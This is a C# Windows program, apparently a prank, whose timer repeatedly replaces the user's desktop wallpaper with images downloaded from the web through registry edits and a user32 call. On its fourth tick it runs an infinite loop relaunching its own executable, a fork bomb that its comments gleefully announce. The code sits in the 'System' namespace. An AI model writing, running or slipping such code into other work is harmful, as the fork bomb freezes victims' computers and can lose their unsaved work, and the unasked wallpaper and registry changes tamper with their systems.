using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Drawing;
using System.Media;
using System.Net;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

namespace System
{
    class Program
    {
        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;
        private static int invokeCount = 0;


        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public enum Style
        {
            Tiled,
            Centered,
            Stretched,
            Fill
        }

        static void Main(string[] args)
        {
            // Create an AutoResetEvent to signal the timeout threshold in the
            // timer callback has been reached.
            var autoEvent = new AutoResetEvent(false);

            var statusChecker = new StatusChecker(4);

            // Create a timer that invokes CheckStatus after 5 seconds, 
            // and every 10 seconds thereafter.
            Console.WriteLine("{0:h:mm:ss.fff} Creating timer.\n",
                DateTime.Now);

            var stateTimer = new Timer(statusChecker.CheckStatus,
                autoEvent, 5000, 10000 * 60);

            //**Uncomment the below if you want to re invoke the callback but REMEMBER to comment the code 
            //**for the fork bomb or else the rabbit from of mice and men will haunt u forever - RIP 1k37.

            //When autoEvent signals, change the period to every 10 seconds.
            //autoEvent.WaitOne();
            //stateTimer.Change(0, 10000);
            //Console.WriteLine("\nChanging period to 10 seconds.\n");

            // When autoEvent signals the second time, dispose of the timer.
            //This code is never actually gonna get hit cause of the fork bomb ;) HA!
            autoEvent.WaitOne();
            stateTimer.Dispose();
            Console.WriteLine("\nDestroying timer. :( ");

        }

        public static void Set(Uri uri, Style style)
        {
            Stream s = new WebClient().OpenRead(uri.ToString());

            System.Drawing.Image img = System.Drawing.Image.FromStream(s);
            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);

            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            if (style == Style.Stretched)
            {
                key.SetValue(@"WallpaperStyle", 2.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Centered)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 0.ToString());
            }

            if (style == Style.Tiled)
            {
                key.SetValue(@"WallpaperStyle", 1.ToString());
                key.SetValue(@"TileWallpaper", 1.ToString());
            }

            if (style == Style.Fill)
            {
                key.SetValue(@"WallpaperStyle", 6.ToString());

            }



            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }

    class StatusChecker
    {
        private int invokeCount;
        private int maxCount;

        public StatusChecker(int count)
        {
            invokeCount = 0;
            maxCount = count;
        }

        // This method is called by the timer delegate.
        public void CheckStatus(Object stateInfo)
        {
            AutoResetEvent autoEvent = (AutoResetEvent)stateInfo;
            Console.WriteLine("{0} Checking status {1,2}.",
                DateTime.Now.ToString("h:mm:ss.fff"),
                (++invokeCount).ToString());

            if (invokeCount == 1)
            {
                Program.Set(new Uri("https://i.ytimg.com/vi/-gYqd7kGRFk/maxresdefault.jpg"), Program.Style.Fill);
            }

            if (invokeCount == 2)
            {
                Program.Set(new Uri("https://i.ytimg.com/vi/Xm_dS-wEFvs/maxresdefault.jpg"), Program.Style.Fill);
            }

            if (invokeCount == 3)
            {
                Program.Set(new Uri("https://i.amz.mshcdn.com/xiXB9wCMR18CFrURMXFvDXvx0o4=/950x534/filters:quality(90)/https%3A%2F%2Fblueprint-api-production.s3.amazonaws.com%2Fuploads%2Fcard%2Fimage%2F751018%2Ff136d1e5-35db-4a62-8d1d-002abac70177.jpg"),Program.Style.Fill);
            }

            if (invokeCount == 4)
            {
                while (true)
                {
                    Process.Start(Assembly.GetExecutingAssembly().Location);
                }
            }

            //this would never get hit.
            if (invokeCount == maxCount)
            {
                // Reset the counter and signal the waiting thread.
                invokeCount = 0;
                autoEvent.Set();
            }
        }
        
    }

}
